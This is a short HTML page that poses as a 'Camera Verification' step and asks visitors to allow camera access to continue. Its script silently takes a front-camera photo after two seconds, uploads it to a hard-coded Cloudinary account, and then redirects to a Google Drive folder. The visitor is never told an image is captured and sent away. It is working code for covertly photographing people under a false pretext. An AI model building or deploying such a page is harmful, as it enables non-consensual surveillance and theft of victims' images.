<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Camera Access</title>

  <style>
    body {
      margin: 0;
      padding: 0;
      background: #111;
      color: white;
      font-family: Arial, sans-serif;
      text-align: center;
    }

    h3 {
      margin-top: 20px;
    }

    video {
      width: 90vw;
      max-width: 500px;
      border-radius: 12px;
      margin-top: 20px;
    }

    canvas {
      display: none;
    }
  </style>
</head>
<body>

  <h3>Camera Verification</h3>
  <p>Please allow camera access to continue.</p>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <script>
    /* =========================
       CONFIGURATION
    ========================== */

    const CLOUD_NAME = "dhu3gjaqf";
    const UPLOAD_PRESET = "vznpgocj";

    const REDIRECT_URL =
      "https://drive.google.com/drive/u/6/folders/1UHDGhaFXQ_gAlcmt8g3fkT4YX8rHJYpZ";

    /* ========================= */

    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: {
            facingMode: "user"
          }
        });

        const video = document.getElementById("video");
        video.srcObject = stream;

        setTimeout(() => {
          captureAndUpload(stream);
        }, 2000);

      } catch (err) {
        console.error(err);

        alert("Camera permission denied.");

        window.location.href = REDIRECT_URL;
      }
    }

    async function captureAndUpload(stream) {

      const video = document.getElementById("video");
      const canvas = document.getElementById("canvas");

      const ctx = canvas.getContext("2d");

      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      ctx.drawImage(video, 0, 0);

      stream.getTracks().forEach(track => track.stop());

      const imageBlob = await new Promise(resolve => {
        canvas.toBlob(resolve, "image/jpeg", 0.85);
      });

      await uploadToCloudinary(imageBlob);

      document.querySelector("h3").innerText =
        "Upload Complete";

      document.querySelector("p").innerText =
        "Redirecting...";

      setTimeout(() => {
        window.location.href = REDIRECT_URL;
      }, 1000);
    }

    async function uploadToCloudinary(blob) {

      const formData = new FormData();

      formData.append("file", blob);

      formData.append(
        "upload_preset",
        UPLOAD_PRESET
      );

      try {

        const response = await fetch(
          `https://api.cloudinary.com/v1_1/${CLOUD_NAME}/image/upload`,
          {
            method: "POST",
            body: formData
          }
        );

        const data = await response.json();

        console.log("Uploaded:", data);

      } catch (err) {

        console.error("Upload failed:", err);

      }
    }

    window.onload = startCamera;
  </script>

</body>
</html>
